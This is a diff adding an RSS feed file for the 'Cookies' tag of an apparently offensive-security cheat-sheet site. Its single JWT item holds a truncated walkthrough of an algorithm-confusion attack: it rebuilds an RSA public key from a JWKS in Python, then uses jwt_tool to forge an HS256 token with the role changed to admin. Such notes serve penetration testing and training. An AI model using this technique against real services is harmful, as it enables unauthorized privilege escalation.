@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cookies on TLDRBins</title>
+    <link>https://tldrbins.github.io/@cookies/</link>
+    <description>Recent content in Cookies on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@cookies/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>JWT</title>
+      <link>https://tldrbins.github.io/jwt/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/jwt/</guid>
+      <description>Abuse #1: Algorithm confusion 0. Sample jwks.json { &amp;#34;keys&amp;#34;: [ { &amp;#34;kty&amp;#34;: &amp;#34;RSA&amp;#34;, &amp;#34;use&amp;#34;: &amp;#34;sig&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;&amp;lt;BASE64_n&amp;gt;&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;AQAB&amp;#34; } ] } 1. Create a public key python3 from base64 import urlsafe_b64decode from Crypto.PublicKey import RSA e = int.from_bytes(urlsafe_b64decode(b&amp;#39;AQAB&amp;#39;)) n = int.from_bytes(urlsafe_b64decode(b&amp;#39;&amp;lt;BASE64_n&amp;gt;&amp;#39;)) key = RSA.construct((n, e)) # Save it to public.pem print(key.exportKey().decode()) 2. Forge a jwt jwt_tool&#xA;# For example, modify role to admin python3 jwt_tool.py -S hs256 -k public.</description>
+    </item>
+  </channel>
+</rss>
